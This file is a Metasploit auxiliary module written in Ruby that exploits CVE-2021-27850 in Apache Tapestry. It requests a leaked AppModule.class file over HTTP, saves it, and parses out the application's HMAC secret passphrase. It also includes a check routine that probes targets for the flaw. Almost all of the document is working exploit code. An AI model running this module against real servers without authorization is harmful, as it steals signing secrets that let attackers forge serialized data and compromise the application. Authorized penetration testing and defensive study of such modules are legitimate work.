##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Tapestry HMAC secret key leak',
        'Description' => %q{
          This exploit finds the HMAC secret key used in Java serialization by Apache Tapestry. This key
          is located in the file AppModule.class by default and looks like the standard representation of UUID in hex digits (hd) :
          6hd-4hd-4hd-4hd-12hd
          If the HMAC key has been changed to look differently, this module won't find the key because it tries to download the file
          and then uses a specific regex to find the key.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Johannes Moritz', # CVE
          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2021-27850']
        ],
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'DisclosureDate' => '2021-04-15'
      )
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETED_CLASS', [true, 'Name of the targeted java class', 'AppModule.class']),
      OptString.new('TARGETURI', [true, 'The base path of the Apache Tapestry Server', '/'])
    ])
  end

  def class_file
    datastore['TARGETED_CLASS']
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', class_file, '/')
    })

    if res.nil?
      Exploit::CheckCode::Unknown
    elsif res.code == 302

      id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/#{class_file}}, 1]
      normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', class_file, '/')
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalized_url
      })

      if res.code == 200 && res.headers['Content-Type'] =~ %r{application/java.*}
        print_good("Java file leak at #{rhost}:#{rport}#{normalized_url}")
        Exploit::CheckCode::Vulnerable
      else
        Exploit::CheckCode::Safe
      end
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/assets/app/something/services/', class_file, '/')
    })

    unless res
      print_bad('Apache Tapestry did not respond.')
      return
    end

    id_url = res.redirection.to_s[%r{assets/app/(\w+)/services/+#{class_file}}, 1]
    normalized_url = normalize_uri(target_uri.path, '/assets/app/', id_url, '/services/', class_file, '/')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_url
    })

    unless res
      print_bad('Either target is not vulnerable or class file does not appear to exist.')
      return
    end

    raw_class_file = res.body.to_s
    if raw_class_file.empty?
      print_bad("#{class_file} could not be obtained.")
      return
    end

    key_marker = 'tapestry.hmac-passphrase'
    unless raw_class_file.include?(key_marker)
      print_bad("HMAC key not found in #{class_file}.")
      return
    end

    # three bytes precede the key itself
    # last two indicate the length of the key
    key_start = raw_class_file.index(key_marker)
    byte_start = key_start + key_marker.length + 1
    key_size = raw_class_file[byte_start..byte_start + 1]
    key_size = key_size.unpack('C*').join.to_i
    byte_start += 2

    key = raw_class_file[byte_start..byte_start + key_size - 1]
    path = store_loot(
      "tapestry.#{class_file}",
      'application/binary',
      rhost,
      raw_class_file
    )

    print_good("Apache Tapestry class file saved at #{path}.")
    if key
      print_good("HMAC key found: #{key}.")
    else
      print_bad(
        'Could not find key. ' \
        "Please check #{path} in case key is in an unexpected format."
      )
    end
  end
end
